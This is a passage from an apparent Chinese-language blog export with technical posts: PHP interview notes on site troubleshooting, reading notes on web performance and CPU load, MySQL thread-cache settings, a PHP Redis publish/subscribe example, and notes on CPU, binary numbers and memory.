进程数、Mysql线程数</li><li>健康巡查：dns 解析、ip 是否可以访问、硬盘、各种基础服务</li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="说一说你所知道的网站攻击方式及如何防范"><a href="#说一说你所知道的网站攻击方式及如何防范" class="headerlink" title="说一说你所知道的网站攻击方式及如何防范"></a>说一说你所知道的网站攻击方式及如何防范</h3><ul><li>CSRF 跨站伪造请求</li><li>XSS 跨站脚本攻击</li><li>SQL 注入</li><li>DDOS 攻击</li></ul><h3 id="如果用户反馈网站慢，你会怎样做？"><a href="#如果用户反馈网站慢，你会怎样做？" class="headerlink" title="如果用户反馈网站慢，你会怎样做？"></a>如果用户反馈网站慢，你会怎样做？</h3><ol><li>资源加载慢<br>i. WebServer 配置静态资源缓存、动静分离<br>ii. DNS 缓存、CDN 加速<br>iii. 增加服务器带宽</li><li>SQL 查询慢<br>i. Mysql 慢查询找出耗时SQL<br>ii. Explain 分析耗时原因<br>iii. 优化SQL</li><li>并发<br>i. 优化PHP-FPM 配置</li></ol><h3 id="如果你发现你部署的网站打不开了，你会如何排查？"><a href="#如果你发现你部署的网站打不开了，你会如何排查？" class="headerlink" title="如果你发现你部署的网站打不开了，你会如何排查？"></a>如果你发现你部署的网站打不开了，你会如何排查？</h3><ol><li>首先检查DNS 解析<br>i. 检查域名解析<br>ii. 排除浏览器缓存</li><li>检查防火墙<br>i. 防火墙是否开启？<br>ii. 端口是否可以正常访问，通常使用telnet 命令检查</li><li>根据网站返回状态码，具体分析<br>i. 404：访问资源不存在<br>ii. 500：服务端错误（代码错误、文件权限）<br>iii. 502：网关错误（webserver 异常导致，Nginx/Apache 发生错误）<br>iiii. 504：网关超时</li><li>查看对应的日志</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/colinlet/PHP-Interview-QA" target="_blank" rel="noopener">PHP面试问答</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《构建高性能 Web 站点》读书笔记</title>
      <link href="/building-a-high-performance-web-site-reading-notes/"/>
      <url>/building-a-high-performance-web-site-reading-notes/</url>
      
        <content type="html"><![CDATA[<p>《构建高性能 Web 站点》读书笔记</p><a id="more"></a><h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><h3 id="等待的真相"><a href="#等待的真相" class="headerlink" title="等待的真相"></a>等待的真相</h3><p>当在浏览器中输入了一个地址，直到浏览器返回页面之前的那段时间里，都发生了一些什么呢？</p><p>大概经历了以下几部分时间：</p><ul><li>数据在网络上传输的时间<ul><li>客户端（浏览器）发出请求数据到达服务器的时间</li><li>服务端（服务器）响应数据经过网络到达客户端的时间</li></ul></li><li>站点服务器处理请求并生成响应数据的时间</li><li>浏览器本地计算和渲染的时间</li></ul><p>“数据在网络上传输的时间”我们通常称之为<strong>响应时间</strong>，它的决定因素主要包括发送的数据量和网络宽带。</p><p>站点服务器处理请求并生成响应数据的时间主要消耗在服务端，其中包括非常多的环节，我们一般用另一个指标来衡量这部分时间，即每秒处理请求数，也称吞吐率，这里的吞吐率并不是指单位时间内处理的数据量，而是请求数。影响服务器吞吐率的因素非常多，比如：服务器的并发策略、I/O 模型、I/O 性能、CPU 核数等，当然也包括应用程序本身的逻辑复杂度等。</p><p>浏览器本地计算和渲染的时间自然消耗在浏览器端，它依赖的因素包括浏览器采用的并发策略、样式渲染方式、脚本解释器的性能、页面大小、页面组件（图片、CSS、JS等）数量、页面组件缓存状况、页面组件域名分布及DNS 解析等。</p><h2 id="数据得网络传输"><a href="#数据得网络传输" class="headerlink" title="数据得网络传输"></a>数据得网络传输</h2><p>因为大多数开发者生活在应用层，这些似乎与他们毫无关系，然而一旦当你开始将注意力转向站点性能时，这些基础知识便是你不能不知道的。</p><blockquote><p>如何计算响应时间</p></blockquote><p>响应时间 = 发送时间 + 传播时间 + 处理时间</p><p>发送时间很容易计算，即”数据量/宽带“，比如要发送100Mbit 的数据，而且发送速度为 100Mbit/s，也就是宽带为 100M，那么发送时间便为 1s。值得注意的是，在两台主机之间往往存在多个交换节点，每次的数据转发，都需要花费发送时间，那么总的发送时间也包括这些转发时所花费的发送时间。</p><p>传播时间主要依赖于传播距离，因为传播速度我们可以近似认为约等于 2.0x10<sup>8</sup>m/s，那么传播时间便等于传播距离除以传播速度。比如两个交换节点之前线路的长度为 1000km，相当于北京到上海的直线距离，那么一个比特信号从线路的一端到另一端的传播时间为 0.005s。</p><p>处理时间就是指数据在交换节点中为存储转发而进行一些必要的处理所花费的时间，其中的重要组成部分就是数据在缓冲区队列中排队所发送的时间。注意，准确地说应该是”你的数据“在队列中排队所花费的时间，因为在队伍中还有其他与你毫不相干的数据。</p><p>如果全世界只有你的服务器和你的用户在传输数据，那么用于排队处理时间可以忽略。</p><p>那么，我们可将响应时间的计算公式整理为：<br>响应时间 = （数据量比特数 / 带宽）+ （传播距离 / 传播速度）+ 处理时间</p><p>另外，下载速度的计算公式如下：<br>下载速度 = 数据量字节数 / 响应时间</p><h2 id="服务器并发处理能力"><a href="#服务器并发处理能力" class="headerlink" title="服务器并发处理能力"></a>服务器并发处理能力</h2><p>吞吐率指的是单位时间内服务器的请求数。</p><p>吞吐率是指在一定并发用户数的情况下，服务器处理请求能力的量化体现。</p><p>我们要统计吞吐率，便存在一些潜在的前提，那就是压力的描述和请求性质的描述。</p><p>压力的描述一般包括两部分，即并发用户数和总请求数，也就是模拟多少个用户同时向服务器发送多少个请求。</p><p>请求性质则是堆请求的URL 所代表的资源的描述，比如 1KB 大小的静态文件，或者包含10 次数据库查询的动态内容等。</p><p>所以，吞吐率的前提包括如下几个条件：</p><ul><li>并发用户数</li><li>总请求数</li><li>请求资源描述</li></ul><h2 id="CPU-并发计算"><a href="#CPU-并发计算" class="headerlink" title="CPU 并发计算"></a>CPU 并发计算</h2><p>服务器之所以可以同时处理多个请求，在于操作系统通过多执行流体希设计使得多个任务可以轮流使用系统资源，这些资源包括CPU、内存以及I/O 等。</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>事实上，大多数进程的时间都主要消耗在了I/O操作上，现代计算机的DMA（Direct Memory Access 直接内存访问）技术可以让CPU 不参与I/O 操作的全过程，比如进程通过系统调用，使得CPU 向网卡或者磁盘等 I/O 设备发出指令，然后进程被挂起，释放出CPU 资源，等待 I/O 设备完成工作后通过中断来通知进程重新就绪。</p><p>每个进行都有自己独立的内存地址空间和生命周期。当子进程被父进程创建后，便将父进程地址空间的所有数据复制到自己的地址空间，完全继承父进程的所有上下文信息，它们之间可以通信，但是不互相依赖，也无权干涉彼此的地址空间。</p><h3 id="进程调度器"><a href="#进程调度器" class="headerlink" title="进程调度器"></a>进程调度器</h3><p>在单CPU 的机器上，虽然我们感觉到很多任务在同时运行，但是从微观意义上讲，任何时刻只有一个进程处于运行状态，而其他的进程有的处于挂起状态并等待就绪，有的已经就绪但等待CPU 时间片，还有的处于其他状态。</p><p>内核中的进程调度器（Scheduler）维护着各种状态的进程队列。在 Linux 中，进程调度器维护着一个包括所有可运行进程的队列，称为“运行队列（Run Quere）”，以及一个包括所有休眠进程和僵尸进程的列表。</p><p>进程调度器的一项重要工作就是决定下一个运行的进程，如果运行队列中有不止一个进程，那就比较伤脑筋了，按照先来后到的顺序也许不是那么合理，因为运行在系统中的进程有着不同的工作需要，比如有些进程需要处理紧急的事件，有些进程只是在后台发送不太紧急的邮件，所以每个进程需要告诉进程调度器它们的紧急程度，这就是<strong>进程优先级</strong>。</p><h3 id="系统负载"><a href="#系统负载" class="headerlink" title="系统负载"></a>系统负载</h3><p>在进程调度器维护的运行队列中，任何时刻至少存在一个进程，那就是正在运行的进程。<br>而当运行队列中有不止一个进程的时候，就说明此时CPU 比较抢手，其他进程还在等着呢，进程调度器应该尽快让正在运行的进程释放CPU。</p><p>通过在任何时刻查看 <code>/proc/loadavg</code>，可以了解到运行队列的情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@localhost:~$ cat &#x2F;proc&#x2F;loadavg </span><br><span class="line">4.28 4.05 4.02 4&#x2F;482 6246</span><br></pre></td></tr></table></figure><p>注意 <code>4/482</code>这部分，其中的 4 代表此时运行队列中的进程个数，而 482 则代表此时的进程总数。</p><p>最右边的 6246 代表到此时为止，最后创建的一个进程ID。</p><p>接下来，左边的三个数值，分别是 4.28、4.05、4.02，它们就是我们常说的系统负载。<br>我们都知道，系统负载越高，代表CPU 越繁忙，越无法很好地满足所有进程的需要。</p><p>但是，系统负载是如何计算而来的呢？根据定义，它是在单位时间内运行队列中就绪等待的进程数平均值，所以当运行队列中就绪进程不需要等待就可以马上获得CPU 的时候，系统负载便非常低。当系统负载为 0.00 时，说明任何进程只要就绪后就可以马上获得 CPU，不需要等待，这时候系统响应速度最快。</p><p>那么，刚才提到的三个数值，便是系统最近 1 分钟、5 分钟、15 分钟分别计算得出的系统负载。</p><p>我们还可以通过其他方法获得系统负载，比如top、w 等工具，从实现方法上看，这些工具获得的系统负载都是来源于 <code>/proc/loadavg</code>。</p><p>了解了这些内容后，要想提高服务器的系统负载，很简单，只需要编写一个没有任何 I/O 操作并且长时间占用 CPU 时间的PHP 脚本，比如一个循环累加器，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$max &#x3D; 100000000;</span><br><span class="line">$sum &#x3D; 0;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $max; ++$i)&#123;</span><br><span class="line">  $sum +&#x3D; $i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure><p>然后用100 个并发用户请求这个脚本，进行压力测试，这时候查看系统负载就会看到如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load average: 98.26, 45.89, 17.94</span><br></pre></td></tr></table></figure><h3 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h3><p>所以，如果我们希望服务器支持较大的并发数，那么就要尽量减少上下文切换次数，最简单的做法就是减少进程数，尽量使用线程并配合其他I/O 模型来设计并发策略。</p><h2 id="I-O模型"><a href="#I-O模型" class="headerlink" title="I/O模型"></a>I/O模型</h2><p>对于网络 I/O和磁盘 I/O，它们的速度要慢很多。这些I/O 操作需要由内核系统调用来完成，同时系统调用显然需要CPU 来调度，而CPU 的速度毫无疑问是非常快的，这就使得CPU 不得不浪费宝贵的时间来等待慢速I/O 操作。</p><p>尽管我们通过多进程等方式来充分利用空闲的CPU 资源，但我们还是希望能够让CPU 花费足够少的时间在I/O 操作的调度上，这样就可以腾出更多的CPU 时间来完成更多的I/O 操作。</p><h3 id="PIO与DMA"><a href="#PIO与DMA" class="headerlink" title="PIO与DMA"></a>PIO与DMA</h3><p>在介绍I/O 模型之前，有必要简单地说说慢速I/O 设备和内存之间的数据传输方式。</p><p>我们拿磁盘来说，很早以前，磁盘和内存之间的数据传输是需要CPU 控制的，也就是说如果我们读取磁盘文件到内存中，数据要经过CPU 存储转发，这种方式称为 PIO。显然这种方式非常不合理，需要占用大量的CPU 时间来读取文件，造成文件访问时系统几乎停止响应。</p><p>后来，DMA（Direct Memory Access 直接内存访问）取代了PIO，它可以不经过CPU 而直接进行磁盘和内存的数据交换。在DMA 模式下，CPU 只需要向DMA 控制器下达指令，让DMA 控制器来处理数据的传输即可，DMA 控制器通过系统总线来传输数据，传送完毕再通知CPU，这样就很大程度上降低了CPU 占有率，大大节省了系统资源，而它的传输速度与PIO 的差异并不是十分明显，因为这主要取决于慢速设备的速度。</p><h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>缓存更加注重的是策略，也就是说缓存命中率，如果每次都能在缓存中找到需要的数据，那是最理想的结果，如果每次都在缓存中找不到需要的数据，那么缓存将变得毫无价值。</p><p>解释器核心引擎根本看不懂这些脚本代码，无法直接执行，所以需要进行一系列的代码分析工作，当解释器完成对脚本代码的分析后，便将它们生成可以直接运行的中间代码，也称为操作码（Operate Code，opcode）。</p><p>对于解释型语言而言，从程序代码到中间代码的这个过程，我们称为解释（parse），它由解释器来完成。对于编译型语言而言，从程序代码到中间代码的这个过程称为编译（compile）。</p><p>编译器和解释器的一个本质区别在于，解释器生成中间代码后，便直接执行它，所以运行时的控制权在解释器; 而编译器则将中间代码进一步优化，生成可以直接运行的目标程序，但不执行它，用户可以在随后的任意时间执行它，这时控制权在目标程序，和编译器没有任何关系。</p><p>事实上，就解释和编译本身而言，它们的原理是相似的，都包括词法分析、语法分析、语义分析等。</p><p>为什么开启 opcode，对性能的提升会巨大？<br>这是因为 PHP 在动态解析语法的过程中，会生成操作码，而打开opcode 缓存，就可以避免重复编译。</p><p>当然，并不是所有的动态内容都在应用了 opcode cache 之后有大幅度的性能提升，因为 opcode cache 的目的是减少CPU 和内存开销，如果动态内容的性能瓶颈不在于CPU 和内存，而在于I/O 操作，比如数据库查询带来的磁盘I/O 开销，那么opcode cache 的性能提升是非常有限的。</p><h2 id="有意义的问题"><a href="#有意义的问题" class="headerlink" title="有意义的问题"></a>有意义的问题</h2><p>Q：假如100 个用户同时向服务器分别进行 10次请求，与 1 个用户向服务器连续进行 1000 次请求，效果一样吗？也就是说给服务器带来的压力一样吗？<br>A：虽然看起来服务器都需要连续处理 1000 个请求，其实关键的区别就在于，是否真的”连续“。<br>首先有一点需要明白，对于压力测试中提到的每一个用户，连续发送请求实际上是指在发送一个请求并接受到响应数据后再发送下一个请求，这样一来，从微观层面来看，1 个用户向服务器连续进行 1000次请求的过程中，任何时刻服务器的网卡接收缓冲区中只有来自该用户的 1 个请求，而 100 个用户同时向服务器分别进行 10 次请求的过程中，服务器网卡接收缓冲区最多有 100 个等待处理的请求，显然这时服务器的压力更大。</p><p>Q：关于worker 进程的数量，既然可以由我们来设置，那么是不是越多越好呢？<br>A：显然不是，任何时刻从CPU 的角度来看，只有一个进程在运行。没有一个绝对的公式来告诉你如何选择worker 进程数，需要根据实际情况具体分析和调整。</p><p>Q：7ms 意味着什么呢？<br>A：一个比特通过光纤从北京传到西安，理论上只需要 5ms; 25 毫秒足以让比特传播接近地球赤道半径的距离。</p><p>Q：缓存的目的？<br>A：缓存的目的就是把需要花费昂贵开销的计算结果保存起来，在以来需要的时候直接取出，避免重复计算。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 中实现 Mysql 连接池与持久化</title>
      <link href="/mysql-connection-pool-and-persistence-in-php/"/>
      <url>/mysql-connection-pool-and-persistence-in-php/</url>
      
        <content type="html"><![CDATA[<p>Mysql 的连接方式有两种：tcp 和 socket。前者是基于<code>tcp/ip</code>协议，后者是基于socket 套接字。</p><a id="more"></a><p>具体：</p><ul><li>tcp/ip：<code>mysql -h 127.0.0.1 -uroot -p</code></li><li>socket：<code>mysql -h localhost -uroot -p</code> 或者 <code>mysql -uroot -p</code></li></ul><p>可以通过 <code>tcpdump</code>命令抓包。</p><p>指定源端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tcpdump -i lo0 port 3306</span><br></pre></td></tr></table></figure><p>如果出现以下内容，表示本地没有<code>lo0</code>这个设备。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump: lo: No such device exists</span><br><span class="line">(BIOCSETIF failed: Device not configured)</span><br></pre></td></tr></table></figure><p>可以通过<code>tcpdump -D</code> 命令查看本地设备名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.en0 [Up, Running]</span><br><span class="line">2.lo0 [Up, Running, Loopback]</span><br></pre></td></tr></table></figure><p>使用<code>mysql -h 127.0.0.1 -uroot -p</code>，可以看到Mysql 的连接过程是基于<code>tcp/ip</code> 协议。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210118172506.png" alt=""></p><p>当客户端退出Mysql 时，会发送四条记录，也就是tcp 的四次挥手。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210118172203.png" alt=""></p><p><code>socket</code> 方式会快于<code>tcp/ip</code>，</p><p>mysql 使用线程来处理连接，每当一个请求进来，MySQL会创建一个线程去处理请求，</p><p>可以使用<code>show status</code>命令查看当前处于连接状态的线程个数，所以在高并发下，这将给MySQL服务器带来巨大的压力，消耗服务器资源。</p><h3 id="Mysql-线程池"><a href="#Mysql-线程池" class="headerlink" title="Mysql 线程池"></a>Mysql 线程池</h3><p>实际上 mysql 实现了线程池，当客户端断开连接后，mysql 会将当前线程缓存起来，当下一次有新的请求进来时，无需创建新的线程。</p><p>查看线程池大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;thread_cache_size&#39;;</span><br></pre></td></tr></table></figure><p>设置线程池大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global thread_cache_size &#x3D; 20;</span><br></pre></td></tr></table></figure><p>查看线程池状态：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show status like &#39;Threads_%&#39;;</span><br><span class="line">+-------------------+-------+</span><br><span class="line">| Variable_name     | Value |</span><br><span class="line">+-------------------+-------+</span><br><span class="line">| Threads_cached    | 8     |</span><br><span class="line">| Threads_connected | 3     |</span><br><span class="line">| Threads_created   | 53    |</span><br><span class="line">| Threads_running   | 1     |</span><br><span class="line">+-------------------+-------+</span><br><span class="line">4 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>Threads_cached</code>：空闲线程数量。当有新的请求进来时，mysql 不会立即创建线程去处理，而是去<code>Threads_cached</code>查看空闲的连接线程，如果存在则直接使用，不存在则创建新的线程。</li><li><code>Threads_connected</code>：当前处于连接状态的线程个数。</li><li><code>Threads_created</code>：创建过的线程数，如果发现<code>Threads_created</code>值过大的话，表明 mysql 服务器一直在创建线程，这也是比较耗资源，可以适当增加配置文件中<code>Thread_cache_size</code>值。</li><li><code>Threads_running</code>：处于激活状态的线程的个数，这个一般都是远小于<code>Threads_connected</code>的。</li></ul><p>线程池的出现解决了频繁的创建连接和销毁连接的问题，但仅有线程池还是不够的，不能解决客户端频繁连接mysql 带来的性能损耗。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.wugenglong.com/post/mysql_connection_pool/" target="_blank" rel="noopener">PHP中实现MySQL连接池与持久化</a></li><li><a href="https://my.oschina.net/u/2394701/blog/2046414" target="_blank" rel="noopener">用Swoole4 打造高并发的PHP协程Mysql连接池</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 实践 Redis 发布订阅</title>
      <link href="/php-practice-redis-publish-and-subscribe/"/>
      <url>/php-practice-redis-publish-and-subscribe/</url>
      
        <content type="html"><![CDATA[<p>Redis 集成了Pub/Sub功能（means Publish, Subscribe）即发布及订阅功能。</p><a id="more"></a><p>Redis 有各种语言的客户端，这里仅以PHP 的客户端来了解Redis 的发布订阅。</p><p>发布者：即publish客户端，无需独占链接，你可以在publish消息的同时，使用同一个redis-client链接进行其他操作（例如：INCR等）</p><p>订阅者：即subscribe客户端，需要独占链接，即进行subscribe期间，redis-client无法穿插其他操作，此时client以阻塞的方式等待“publish端”的消息；<br>这一点很好理解，因此subscribe端需要使用单独的链接，甚至需要在额外的线程中使用。</p><h2 id="终端实现"><a href="#终端实现" class="headerlink" title="终端实现"></a>终端实现</h2><p>订阅者订阅频道：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210122165931.png" alt=""></p><p>发布者向频道中发送内容<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210122170004.png" alt=""></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>subscribe 客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$redis &#x3D; getConnect();</span><br><span class="line">$redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1); </span><br><span class="line"></span><br><span class="line">$redis-&gt;subscribe([&quot;channel1&quot;], function ($instance, $chan, $msg) &#123;</span><br><span class="line">echo $msg;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * $instance 是上面创建的Redis 实例对象，因为独占链接的关系，该实例不能执行其他操作。</span><br><span class="line"> * 如果要使用Redis，需新建一个连接</span><br><span class="line"> *&#x2F;</span><br><span class="line">$redis &#x3D; getConnect();</span><br><span class="line">$redis-&gt;get(&quot;name&quot;);</span><br><span class="line">&#x2F;&#x2F; todo 业务逻辑</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function getConnect()</span><br><span class="line">&#123;</span><br><span class="line">$redis &#x3D; new Redis();</span><br><span class="line">$redis-&gt;connect(&quot;127.0.0.1&quot;, 6379);</span><br><span class="line">$redis-&gt;auth(&quot;&quot;);</span><br><span class="line">return $redis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>publish 客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$redis &#x3D; new Redis();</span><br><span class="line">$redis-&gt;connect(&quot;127.0.0.1&quot;, 6379);</span><br><span class="line"></span><br><span class="line">$redis-&gt;publish(&#39;channel1&#39;, &#39;hello, redis&#39;);</span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>subscribe 客户端需要手动设置不超时，有两种方式：</p><ol><li><code>ini_set(&#39;default_socket_timeout&#39;, -1)</code></li><li><code>$redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1)</code></li></ol><p>如果不设置不超时，60s后会报一个错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught RedisException: read error on connection to 127.0.0.1:6379</span><br></pre></td></tr></table></figure><p>方式一是通过临时修改 <code>php.ini</code> 配置项，<code>default_socket_timeout</code>默认为 60s 。</p><p><code>default_socket_timeout</code> 是socket流的超时参数，即socket流从建立到传输再到关闭整个过程必须要在这个参数设置的时间以内完成，如果不能完成，那么PHP将自动结束这个socket并返回一个警告。</p><p>推荐第二种，因为方式二是通过修改redis的配置项，因此仅对redis连接生效，相对于方式一，不会产生意外的对其他部分的影响。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://segmentfault.com/a/1190000020385114" target="_blank" rel="noopener">php实现redis消息发布订阅</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《程序是怎样跑起来的》读书笔记</title>
      <link href="/How-does-the-program-run-reading-notes/"/>
      <url>/How-does-the-program-run-reading-notes/</url>
      
        <content type="html"><![CDATA[<p>《程序是怎样跑起来的》读书笔记</p><a id="more"></a><h2 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h2><p>CPU（计算机）能够直接识别和执行的只有机器语言。使用 C、Java 等语 言编写的程序，最后都会转化成机器语言。</p><p>CPU 和内存是由许多晶体管组成的电子部件，通常称为 IC (Integrated Circuit，集成电路)。</p><p>CPU 的内部由寄存器、控制器、运算器和时钟四个部分构成，各部分之间 由电流信号相互连通。</p><ul><li>寄存器： 寄存器可用来暂存<strong>指令</strong>、<strong>数据</strong>等处理对象，可以将其看作是内存的一种。根据种类的不同，一个 CPU 内部会有20~100 个寄存器。</li><li>控制器：控制器负责把内存上的指令、数据等读入寄存器，并根据指令的执行结果来控制整个计算机。</li><li>运算器：运算器负责运算从内存读入寄存器的数据。 </li><li>时钟：时钟负责发出 CPU 开始计时的时钟信号。</li></ul><p>时钟信号英文叫作 clock puzzle。Pentium 2 GHz 表示时钟信号的频率为 2 GHz(1 GHz = 10 亿次 / 秒)。也就是说，时钟信号的频率越高，CPU 的 运行速度越快。</p><p>通常我 们将汇编语言编写的程序转化成机器语言的过程称为 汇编;反之，机器语言程序转化成汇编语言程序的过程则称为 反汇编。</p><p>高级语言编写的程序 =》经过编译转换为机器语言=》CPU内部的寄存器来进行处理。</p><p>编译指的是使用高级编程语言编写的程序转换为机器语言的过程，其中，用于转换的程序被称为编译器。</p><p>对于程序员来说，CPU 是什么呢？CPU 是具有各种功能的寄存器的集合体，所以可以将寄存器理解成是CPU 的核心，主要承担着指令、数据的处理。</p><p>二进制转十进制的方式：即各位数的数值和位权相乘后再相加的数值。</p><p>位权的概念：39 = 3 * 10 + 9 * 1 其中 10 和 1 就是位权。<br>在十进制中，第 1 位(最右边的一位) 是 10 的 0 次幂 A(= 1)，第 2 位是 10 的 1 次幂(= 10)，第 3 位是 10 的 2 次幂(= 100)。</p><p>在二进制中，第 1 位是 2 的 0 次幂 (= 1)，第2位是2的1次幂(= 2)，这就是位权。</p><p>无论程序中使用的是多少进制，计算机最终都会转换为二进制来处理。</p><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><p>二进制的运算方式是：<br>对于十进制，进行加法运算时逢十进一，进行减法运算时借一当十；<br>对于二进制，进行加法运算时逢二进一，进行减法运算时借一当二。</p><p>二进制数中表示负数值时，一般会把最高位作为符号来使用，因此我们把这个最高位称为符号位。 符号位是 0 时表示正数 ，符号位是 1 时表示负数。</p><p>将二进制数的值取反后加 1 的结果，和原来的值相加，结果为0 。<br>实际上就是1 + (-1) = 0</p><h3 id="计算机进行小数运算"><a href="#计算机进行小数运算" class="headerlink" title="计算机进行小数运算"></a>计算机进行小数运算</h3><blockquote><p>为什么将0.1 累加一百次无法得到 10？</p></blockquote><p>这是因为计算机无法准确用二进制表示 0.1，</p><p>十进制的0.1 转换成二进制后，会变成<code>0.00011001100...</code>(1100 循环)这样的 循环小数，这和无法用十进制准确表示 1/3 一样的道理。</p><p>因此，在 遇到循环小数时，计算机就会根据变量数据类型所对应的长度将数值 从中间截断或者四舍五入。</p><p>小 数 点 后 4 位 用 二 进 制 数 表 示 时 的 数 值 范 围 为 <code>0.0000~0.1111</code>。因此，这里只能表示 0.5、0.25、0.125、0.0625 这四个 二进制数小数点后面的位权组合而成(相加总和)的小数。</p><p>所以0.5 累加一百次可以到的 50，而0.1 累加一百次则会丢失精度。</p><h4 id="二进制和十进制"><a href="#二进制和十进制" class="headerlink" title="二进制和十进制"></a>二进制和十进制</h4><p>在实际的程序中，往往不会直接使用二进制来表示，因为太长了，一个二进制就需要八位来表示。</p><p>二进制数的 4 位，正好相当于十六进制数的 1 位。</p><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>其实，从物理上来看，内存的构造非常简单。只要在程序上花一些心思，就可以将内存变换成各种各样的数据结构来使用。</p><p>内存实际上是一种名为内存 IC 的电子元件。</p><p>内存 IC 中有电源、地址信号、数据信号、控制信号等用于输入输出的大量引脚(IC 的引脚)，通过为其指定地址(address)，来进行数据的读写。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210121215618.png" alt=""></p><p>那么，这个内存IC 中能存放多少数据呢？</p><ol><li>数据信号引脚有 D0~D7共八个，表示一次可以输入输出 8 位(= 1 字节)的数据。</li><li>地址信<br>号引脚有 A0<del>A9 共十个，表示可以指定 `0000000000</del>1111111111` 共1024 个地址。</li><li>而地址是用来表示数据的存储场所，因此我们可以得出这 A个内存 IC 中可以存储 1024 个 1 字节的数据。因为 1024 = 1K，所以改内存IC 的容量是1KB。</li></ol><h3 id="指针"><a href="#指针" class="headerlink" 